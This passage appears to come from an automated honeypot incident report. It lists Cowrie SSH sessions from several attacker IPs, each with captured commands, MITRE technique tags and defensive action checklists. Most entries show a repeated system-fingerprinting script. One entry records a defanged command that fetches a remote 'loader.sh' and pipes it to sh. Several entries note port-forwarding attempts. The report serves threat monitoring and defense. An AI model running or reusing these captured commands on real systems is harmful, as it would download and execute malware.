| `2026-07-26 05:06:29` | `cowrie.command.success` |
| `2026-07-26 05:06:29` | `cowrie.command.input` |
| `2026-07-26 05:06:29` | `cowrie.command.input` |
| `2026-07-26 05:06:29` | `cowrie.command.input` |
| `2026-07-26 05:06:29` | `cowrie.command.input` |
| `2026-07-26 05:06:30` | `cowrie.log.closed` |
| `2026-07-26 05:06:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09784243b2b8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:08 |
| **Last Seen** | 2026-07-26 05:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:08:06` | `cowrie.session.connect` |
| `2026-07-26 05:08:07` | `cowrie.client.version` |
| `2026-07-26 05:08:07` | `cowrie.client.kex` |
| `2026-07-26 05:08:09` | `cowrie.login.success` |
| `2026-07-26 05:08:10` | `cowrie.session.params` |
| `2026-07-26 05:08:10` | `cowrie.command.input` |
| `2026-07-26 05:08:10` | `cowrie.command.input` |
| `2026-07-26 05:08:10` | `cowrie.command.input` |
| `2026-07-26 05:08:10` | `cowrie.command.input` |
| `2026-07-26 05:08:10` | `cowrie.command.input` |
| `2026-07-26 05:08:10` | `cowrie.command.success` |
| `2026-07-26 05:08:10` | `cowrie.command.input` |
| `2026-07-26 05:08:10` | `cowrie.command.input` |
| `2026-07-26 05:08:10` | `cowrie.command.input` |
| `2026-07-26 05:08:10` | `cowrie.command.input` |
| `2026-07-26 05:08:10` | `cowrie.log.closed` |
| `2026-07-26 05:08:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e407f377957

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:09 |
| **Last Seen** | 2026-07-26 05:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:09:45` | `cowrie.session.connect` |
| `2026-07-26 05:09:46` | `cowrie.client.version` |
| `2026-07-26 05:09:46` | `cowrie.client.kex` |
| `2026-07-26 05:09:48` | `cowrie.login.success` |
| `2026-07-26 05:09:49` | `cowrie.session.params` |
| `2026-07-26 05:09:49` | `cowrie.command.input` |
| `2026-07-26 05:09:49` | `cowrie.command.input` |
| `2026-07-26 05:09:49` | `cowrie.command.input` |
| `2026-07-26 05:09:49` | `cowrie.command.input` |
| `2026-07-26 05:09:49` | `cowrie.command.input` |
| `2026-07-26 05:09:49` | `cowrie.command.success` |
| `2026-07-26 05:09:49` | `cowrie.command.input` |
| `2026-07-26 05:09:49` | `cowrie.command.input` |
| `2026-07-26 05:09:49` | `cowrie.command.input` |
| `2026-07-26 05:09:49` | `cowrie.command.input` |
| `2026-07-26 05:09:49` | `cowrie.log.closed` |
| `2026-07-26 05:09:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2234b5ffd8aa

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:11 |
| **Last Seen** | 2026-07-26 05:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:11:25` | `cowrie.session.connect` |
| `2026-07-26 05:11:26` | `cowrie.client.version` |
| `2026-07-26 05:11:26` | `cowrie.client.kex` |
| `2026-07-26 05:11:28` | `cowrie.login.success` |
| `2026-07-26 05:11:29` | `cowrie.session.params` |
| `2026-07-26 05:11:29` | `cowrie.command.input` |
| `2026-07-26 05:11:29` | `cowrie.command.input` |
| `2026-07-26 05:11:29` | `cowrie.command.input` |
| `2026-07-26 05:11:29` | `cowrie.command.input` |
| `2026-07-26 05:11:29` | `cowrie.command.input` |
| `2026-07-26 05:11:29` | `cowrie.command.success` |
| `2026-07-26 05:11:29` | `cowrie.command.input` |
| `2026-07-26 05:11:29` | `cowrie.command.input` |
| `2026-07-26 05:11:29` | `cowrie.command.input` |
| `2026-07-26 05:11:29` | `cowrie.command.input` |
| `2026-07-26 05:11:29` | `cowrie.log.closed` |
| `2026-07-26 05:11:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acdecb4e7adf

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:13 |
| **Last Seen** | 2026-07-26 05:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:13:05` | `cowrie.session.connect` |
| `2026-07-26 05:13:06` | `cowrie.client.version` |
| `2026-07-26 05:13:06` | `cowrie.client.kex` |
| `2026-07-26 05:13:07` | `cowrie.login.success` |
| `2026-07-26 05:13:08` | `cowrie.session.params` |
| `2026-07-26 05:13:08` | `cowrie.command.input` |
| `2026-07-26 05:13:08` | `cowrie.command.input` |
| `2026-07-26 05:13:08` | `cowrie.command.input` |
| `2026-07-26 05:13:08` | `cowrie.command.input` |
| `2026-07-26 05:13:08` | `cowrie.command.input` |
| `2026-07-26 05:13:08` | `cowrie.command.success` |
| `2026-07-26 05:13:08` | `cowrie.command.input` |
| `2026-07-26 05:13:08` | `cowrie.command.input` |
| `2026-07-26 05:13:08` | `cowrie.command.input` |
| `2026-07-26 05:13:08` | `cowrie.command.input` |
| `2026-07-26 05:13:09` | `cowrie.log.closed` |
| `2026-07-26 05:13:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3f458acbd17

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]174` |
| **First Seen** | 2026-07-26 05:13 |
| **Last Seen** | 2026-07-26 05:15 |
| **Session Duration** | 105s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `su, shell, uname -a, cd /var/run || cd /mnt || cd /root || cd /; wget -qO- hxxp://164.215.103[.]113:6996/pikujyhtcxz/loader.sh | sh -s 164.215.103[.]113` |
| **Download Attempts** | hxxp://164.215.103[.]113:6996/pikujyhtcxz/loader.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:13:51` | `cowrie.session.connect` |
| `2026-07-26 05:13:52` | `cowrie.login.success` |
| `2026-07-26 05:13:53` | `cowrie.session.params` |
| `2026-07-26 05:13:53` | `cowrie.command.input` |
| `2026-07-26 05:13:54` | `cowrie.command.input` |
| `2026-07-26 05:13:54` | `cowrie.command.failed` |
| `2026-07-26 05:13:55` | `cowrie.command.input` |
| `2026-07-26 05:13:57` | `cowrie.command.input` |
| `2026-07-26 05:13:57` | `cowrie.session.file_download` |
| `2026-07-26 05:15:37` | `cowrie.log.closed` |
| `2026-07-26 05:15:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]174` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-980328233851

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]220` |
| **First Seen** | 2026-07-26 05:14 |
| **Last Seen** | 2026-07-26 05:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:14:16` | `cowrie.session.connect` |
| `2026-07-26 05:14:17` | `cowrie.login.success` |
| `2026-07-26 05:14:17` | `cowrie.session.params` |
| `2026-07-26 05:14:18` | `cowrie.command.input` |
| `2026-07-26 05:14:18` | `cowrie.command.input` |
| `2026-07-26 05:14:19` | `cowrie.command.input` |
| `2026-07-26 05:14:19` | `cowrie.command.input` |
| `2026-07-26 05:14:19` | `cowrie.command.failed` |
| `2026-07-26 05:14:20` | `cowrie.log.closed` |
| `2026-07-26 05:14:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]220` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]220` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6aed1f2dd215

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-26 05:14 |
| **Last Seen** | 2026-07-26 05:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:14:35` | `cowrie.session.connect` |
| `2026-07-26 05:14:35` | `cowrie.client.version` |
| `2026-07-26 05:14:35` | `cowrie.client.kex` |
| `2026-07-26 05:14:35` | `cowrie.login.success` |
| `2026-07-26 05:14:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bd09f55fc75

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-26 05:14 |
| **Last Seen** | 2026-07-26 05:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:14:36` | `cowrie.session.connect` |
| `2026-07-26 05:14:36` | `cowrie.client.version` |
| `2026-07-26 05:14:36` | `cowrie.client.kex` |
| `2026-07-26 05:14:36` | `cowrie.login.success` |
| `2026-07-26 05:14:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a0eb3222f0d

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-26 05:14 |
| **Last Seen** | 2026-07-26 05:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:14:37` | `cowrie.session.connect` |
| `2026-07-26 05:14:37` | `cowrie.client.version` |
| `2026-07-26 05:14:37` | `cowrie.client.kex` |
| `2026-07-26 05:14:37` | `cowrie.login.success` |
| `2026-07-26 05:14:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7025d53e1042

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-26 05:14 |
| **Last Seen** | 2026-07-26 05:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:14:37` | `cowrie.session.connect` |
| `2026-07-26 05:14:37` | `cowrie.client.version` |
| `2026-07-26 05:14:37` | `cowrie.client.kex` |
| `2026-07-26 05:14:37` | `cowrie.login.success` |
| `2026-07-26 05:14:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-035a06c57d1e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:14 |
| **Last Seen** | 2026-07-26 05:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:14:47` | `cowrie.session.connect` |
| `2026-07-26 05:14:47` | `cowrie.client.version` |
| `2026-07-26 05:14:47` | `cowrie.client.kex` |
| `2026-07-26 05:14:49` | `cowrie.login.success` |
| `2026-07-26 05:14:50` | `cowrie.session.params` |
| `2026-07-26 05:14:50` | `cowrie.command.input` |
| `2026-07-26 05:14:50` | `cowrie.command.input` |
| `2026-07-26 05:14:50` | `cowrie.command.input` |
| `2026-07-26 05:14:50` | `cowrie.command.input` |
| `2026-07-26 05:14:50` | `cowrie.command.input` |
| `2026-07-26 05:14:50` | `cowrie.command.success` |
| `2026-07-26 05:14:50` | `cowrie.command.input` |
| `2026-07-26 05:14:50` | `cowrie.command.input` |
| `2026-07-26 05:14:50` | `cowrie.command.input` |
| `2026-07-26 05:14:50` | `cowrie.command.input` |
| `2026-07-26 05:14:51` | `cowrie.log.closed` |
| `2026-07-26 05:14:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2afecb08c147

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-26 05:15 |
| **Last Seen** | 2026-07-26 05:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:15:54` | `cowrie.session.connect` |
| `2026-07-26 05:15:54` | `cowrie.client.version` |
| `2026-07-26 05:15:54` | `cowrie.client.kex` |
| `2026-07-26 05:15:55` | `cowrie.login.success` |
| `2026-07-26 05:15:55` | `cowrie.direct-tcpip.request` |
| `2026-07-26 05:15:55` | `cowrie.direct-tcpip.data` |
| `2026-07-26 05:15:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4c760f14324

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:16 |
| **Last Seen** | 2026-07-26 05:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:16:29` | `cowrie.session.connect` |
| `2026-07-26 05:16:29` | `cowrie.client.version` |
| `2026-07-26 05:16:29` | `cowrie.client.kex` |
| `2026-07-26 05:16:31` | `cowrie.login.success` |
| `2026-07-26 05:16:33` | `cowrie.session.params` |
| `2026-07-26 05:16:33` | `cowrie.command.input` |
| `2026-07-26 05:16:33` | `cowrie.command.input` |
| `2026-07-26 05:16:33` | `cowrie.command.input` |
| `2026-07-26 05:16:33` | `cowrie.command.input` |
| `2026-07-26 05:16:33` | `cowrie.command.input` |
| `2026-07-26 05:16:33` | `cowrie.command.success` |
| `2026-07-26 05:16:33` | `cowrie.command.input` |
| `2026-07-26 05:16:33` | `cowrie.command.input` |
| `2026-07-26 05:16:33` | `cowrie.command.input` |
| `2026-07-26 05:16:33` | `cowrie.command.input` |
| `2026-07-26 05:16:33` | `cowrie.log.closed` |
| `2026-07-26 05:16:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-022052433d2f

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]238` |
| **First Seen** | 2026-07-26 05:18 |
| **Last Seen** | 2026-07-26 05:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:18:06` | `cowrie.session.connect` |
| `2026-07-26 05:18:07` | `cowrie.client.version` |
| `2026-07-26 05:18:07` | `cowrie.client.kex` |
| `2026-07-26 05:18:09` | `cowrie.login.success` |
| `2026-07-26 05:18:10` | `cowrie.direct-tcpip.request` |
| `2026-07-26 05:18:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]238` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59aa0156b0e3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:18 |
| **Last Seen** | 2026-07-26 05:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:18:07` | `cowrie.session.connect` |
| `2026-07-26 05:18:08` | `cowrie.client.version` |
| `2026-07-26 05:18:08` | `cowrie.client.kex` |
| `2026-07-26 05:18:09` | `cowrie.login.success` |
| `2026-07-26 05:18:11` | `cowrie.session.params` |
| `2026-07-26 05:18:11` | `cowrie.command.input` |
| `2026-07-26 05:18:11` | `cowrie.command.input` |
| `2026-07-26 05:18:11` | `cowrie.command.input` |
| `2026-07-26 05:18:11` | `cowrie.command.input` |
| `2026-07-26 05:18:11` | `cowrie.command.input` |
| `2026-07-26 05:18:11` | `cowrie.command.success` |
| `2026-07-26 05:18:11` | `cowrie.command.input` |
| `2026-07-26 05:18:11` | `cowrie.command.input` |
| `2026-07-26 05:18:11` | `cowrie.command.input` |
| `2026-07-26 05:18:11` | `cowrie.command.input` |
| `2026-07-26 05:18:11` | `cowrie.log.closed` |
| `2026-07-26 05:18:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d43297fb67c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:19 |
| **Last Seen** | 2026-07-26 05:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:19:43` | `cowrie.session.connect` |
| `2026-07-26 05:19:43` | `cowrie.client.version` |
| `2026-07-26 05:19:43` | `cowrie.client.kex` |
| `2026-07-26 05:19:45` | `cowrie.login.success` |
| `2026-07-26 05:19:46` | `cowrie.session.params` |
| `2026-07-26 05:19:46` | `cowrie.command.input` |
| `2026-07-26 05:19:46` | `cowrie.command.input` |
| `2026-07-26 05:19:46` | `cowrie.command.input` |
| `2026-07-26 05:19:46` | `cowrie.command.input` |
| `2026-07-26 05:19:46` | `cowrie.command.input` |
| `2026-07-26 05:19:46` | `cowrie.command.success` |
| `2026-07-26 05:19:46` | `cowrie.command.input` |
| `2026-07-26 05:19:46` | `cowrie.command.input` |
| `2026-07-26 05:19:46` | `cowrie.command.input` |
| `2026-07-26 05:19:46` | `cowrie.command.input` |
| `2026-07-26 05:19:47` | `cowrie.log.closed` |
| `2026-07-26 05:19:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a522f74c8ea6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-26 05:20 |
| **Last Seen** | 2026-07-26 05:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

